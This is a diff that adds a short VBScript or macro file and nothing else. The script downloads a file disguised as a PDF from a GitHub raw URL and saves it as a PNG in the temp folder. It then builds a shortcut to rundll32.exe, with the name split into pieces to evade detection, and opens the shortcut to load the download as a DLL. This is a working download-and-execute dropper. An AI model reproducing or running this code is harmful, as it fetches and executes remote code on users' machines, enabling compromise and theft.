@@ -1,0 +1,33 @@
+  Const ADTYPEBINARY = 1
+  Const ADSAVECREATEOVERWRITE = 2
+  
+  Dim xHttp
+  Dim bStrm
+  Dim filename
+  
+  set fss = CreateObject("Scripting.FileSystemObject")
+  sf2 = fss.GetSpecialFolder(2)
+
+  filename = sf2 & "\Imagew000.png"  
+  Set xHttp = CreateObject("Microsoft.XMLHTTP")
+  xHttp.Open "GET", "https://raw.githubusercontent.com/dduckworld/oletools/master/Intro.pdf", False
+  xHttp.Send
+  
+  Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")
+  
+  gobjBinaryOutputStream.Type = ADTYPEBINARY
+  gobjBinaryOutputStream.Open
+  gobjBinaryOutputStream.Write xHttp.responseBody
+  gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE
+  
+  Set WshShell = CreateObject("WScript.Shell")  
+  Set lnk = WshShell.CreateShortcut(sf2 & "\myimg.lnk")
+  lnk.TargetPath = "Ru" & "NDL" & "l32.e" & "xe"
+  lnk.Arguments = """" & filename & """,BITS"
+  lnk.Save()
+  
+  set fo = CreateObject("Shell.Application")
+  fo.Open(sf2 & "\myimg.lnk")
+  
+
+ 
